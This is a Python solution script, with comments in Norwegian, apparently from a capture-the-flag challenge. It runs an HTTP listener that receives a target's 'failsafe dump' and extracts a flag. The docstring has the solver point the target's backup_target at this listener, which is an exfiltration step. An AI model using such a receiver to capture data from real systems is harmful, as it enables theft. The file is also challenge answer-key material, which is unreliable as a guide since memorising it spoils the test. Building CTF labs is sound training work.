# -*- coding: utf-8 -*-
"""Lyttepost for BRAIN-hovedkvarteret — fase 3 (eksfiltrering).

Netcat-erstating for Windows: tar imot Cerebrums failsafe-dump og viser
hele kroppen — flagget inkludert. `python -m http.server` er ikke godt
nok her: den svarer på POST, men logger aldri kroppen, så flagget forsvinner.

Kjør på VERTEN (ikke i containeren):
    python solution/lytter.py            # lytter pa 0.0.0.0:4444
    python solution/lytter.py 8080      # egen port

Gi lederen denne adressen som backup_target:
    http://host.docker.internal:4444

Rådump lagres i tillegg til solution/mottatt_post.txt som sikkerhetsnett.
Avslutt med CTRL+C.
"""

from __future__ import annotations

import re
import sys
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

HER = Path(__file__).resolve().parent
FLAGG_RE = re.compile(r"CES\{[^}]*\}")


def si(*args) -> None:
    """print med flush — en lytter skal aldri holde på utskriften sin."""
    print(*args, flush=True)


class Mottaker(BaseHTTPRequestHandler):
    """Skriver ut alt som kommer inn — og svarer 200 slik at failsafen lykkes."""

    def do_POST(self) -> None:
        lengde = int(self.headers.get("Content-Length") or 0)
        kropp = self.rfile.read(lengde).decode("utf-8", errors="replace")

        stempel = datetime.now().strftime("%H:%M:%S")
        linje = "=" * 70
        si(f"\n{linje}")
        si(f"[{stempel}] POST {self.path} fra {self.client_address[0]} ({lengde} bytes)")
        si(linje)
        si(kropp)

        flagg = FLAGG_RE.findall(kropp)
        if flagg:
            si(f"\n>>> FLAGG FUNNET: {', '.join(flagg)} <<<")

        ut = HER / "mottatt_post.txt"
        ut.write_text(kropp, encoding="utf-8")
        si(f"\n(dump lagret til {ut})")

        self._svar(b"OK - mottatt.")

    def do_GET(self) -> None:
        # Håndslag: lar deg sjekke at adressen svarer (f.eks. fra containeren).
        self._svar(b"lytteposten svarer.")

    def _svar(self, innhold: bytes) -> None:
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(innhold)))
        self.end_headers()
        self.wfile.write(innhold)

    def log_message(self, *_args) -> None:
        pass  # vi logger selv i do_POST.


def main() -> None:
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
    tjener = ThreadingHTTPServer(("0.0.0.0", port), Mottaker)
    si(f"Lytter på port {port} …")
    si(f"  Fra containeren: http://host.docker.internal:{port}")
    si(f"  Fra verten:      http://localhost:{port}")
    si("CTRL+C for å stoppe.")
    try:
        tjener.serve_forever()
    except KeyboardInterrupt:
        si("\nStoppet.")


if __name__ == "__main__":
    main()
